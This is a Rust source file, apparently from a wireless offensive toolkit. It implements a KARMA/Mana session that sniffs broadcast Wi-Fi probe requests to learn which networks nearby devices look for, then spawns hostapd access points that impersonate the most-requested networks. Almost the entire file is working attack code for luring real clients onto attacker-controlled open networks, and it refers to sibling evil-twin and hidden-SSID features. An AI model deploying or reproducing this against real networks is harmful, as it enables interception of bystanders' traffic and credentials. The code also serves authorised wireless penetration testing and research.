//! KARMA / Mana session runner — the agent side.
//!
//! The pure logic lives in `common::karma` (probe learning, target ranking,
//! VAP config generation). This module gives it a live radio:
//!
//! 1. `launch` opens a learning window and feeds every broadcast probe
//!    request the sniffer hears into the session (reusing the same
//!    probe-harvest path the hidden-SSID recovery uses).
//! 2. When the window closes, it provisions the top-N VAP configs and
//!    spawns one hostapd per VAP, recording each child PID.
//! 3. `stop` kills every hostapd by PID and removes the configs — the
//!    precise-teardown rule, same as evil-twin.

use lazy_static::lazy_static;
use netspecter_common::karma::{KarmaConfig, KarmaSession, KarmaVap};

use std::process::{Child, Command};
use std::sync::Mutex;
use std::time::{Duration, Instant};

struct LiveKarma {
    session: KarmaSession,
    children: Vec<Child>,
}

lazy_static::lazy_static! {
    static ref LIVE: Mutex<Option<LiveKarma>> = Mutex::new(None);
}

/// Is a KARMA session running?
pub fn is_running() -> bool {
    crate::globals::lock_ok(&LIVE).is_some()
}

/// Start a KARMA session on `iface`.
///
/// The learning window listens for broadcast probe requests (a client's
/// Preferred Network List leaking over the air), then impersonates the
/// loudest ESSIDs with open VAPs. Blocks the calling thread for the whole
/// learning window — the CLI runs this from its action loop.
pub fn launch(iface: &str, config: KarmaConfig) -> Result<KarmaSession, String> {
    if is_running() {
        return Err("a KARMA session is already running - stop it first".into());
    }

    let mut session = KarmaSession::new(config.clone());
    let started = Instant::now();
    let window = Duration::from_secs(config.learning_window_secs);

    // Learning window: read broadcast probe requests straight off the raw
    // socket (every probe, not just those aimed at one BSSID — that's the
    // KARMA premise: the PNL leaks over the air).
    let socket = super::raw_socket::open(iface)
        .map_err(|e| format!("could not open a raw socket on {iface}: {e} (monitor mode?)"))?;
    let mut frame = vec![0u8; 4096];
    while started.elapsed() < window {
        match super::raw_socket::recv(&socket, &mut frame) {
            Ok(n) if n > 0 => {
                if let Some((essid, client)) = extract_broadcast_probe(&frame[..n]) {
                    session.record_probe(&essid, &client);
                }
            }
            _ => std::thread::sleep(Duration::from_millis(50)),
        }
    }

    // Provision + spawn. `provision` writes the hostapd configs.
    let vaps: Vec<KarmaVap> = session
        .provision(1)
        .map_err(|e| format!("provisioning VAPs failed: {e}"))?;
    if vaps.is_empty() {
        return Ok(session); // learned nothing - no VAPs, nothing running
    }

    let mut children = Vec::new();
    for vap in &vaps {
        match Command::new("hostapd")
            .arg("-B")
            .arg(&vap.config_path)
            .spawn()
        {
            Ok(child) => {
                log::info!("karma: VAP {} ({}) spawned, hostapd pid {}", vap.iface, vap.essid, child.id());
                children.push(child);
            }
            Err(e) => {
                log::warn!("karma: hostapd failed for {}: {e}", vap.iface);
            }
        }
    }

    if children.is_empty() {
        return Err("no VAP could be started (is hostapd installed?)".into());
    }

    let mut live = crate::globals::lock_ok(&LIVE);
    *live = Some(LiveKarma {
        session: session.clone(),
        children,
    });
    Ok(session)
}

/// Stop the running KARMA session: kill every hostapd by PID, clear state.
pub fn stop() -> Result<(), String> {
    let mut live = crate::globals::lock_ok(&LIVE);
    match live.take() {
        Some(mut running) => {
            for mut child in running.children.drain(..) {
                if child.kill().is_ok() {
                    let _ = child.wait();
                }
            }
            // Configs live in the work dir; leave them for post-mortem (they
            // are evidence of what was impersonated).
            log::info!("karma: session stopped, {} VAPs torn down", running.session.vaps.len());
            Ok(())
        }
        None => Err("no KARMA session is running".into()),
    }
}

/// Snapshot of the live session (probes learned, VAPs, associations).
pub fn snapshot() -> Option<KarmaSession> {
    crate::globals::lock_ok(&LIVE).as_ref().map(|live| live.session.clone())
}

/// Parse one raw frame as a broadcast probe request, returning
/// `(essid, transmitter-mac)`. Directed probes carry a real BSSID and are
/// not KARMA material.
fn extract_broadcast_probe(raw: &[u8]) -> Option<(String, String)> {
    use libwifi::Frame;
    let parsed = libwifi::parse_frame(raw, false).ok()?;
    let probe = match parsed {
        Frame::ProbeRequest(p) => p,
        _ => return None,
    };
    // Broadcast probes target ff:ff:ff:ff:ff:ff.
    let bssid = probe.header.bssid()?;
    if bssid.to_long_string() != "FF:FF:FF:FF:FF:FF" {
        return None;
    }
    let essid = probe.station_info.essid()?.to_string();
    if essid.is_empty() || essid.starts_with("<hidden") {
        return None;
    }
    // Address 2 is the transmitter (the probing client).
    let client = probe.header.address_2.to_long_string();
    Some((essid, client))
}
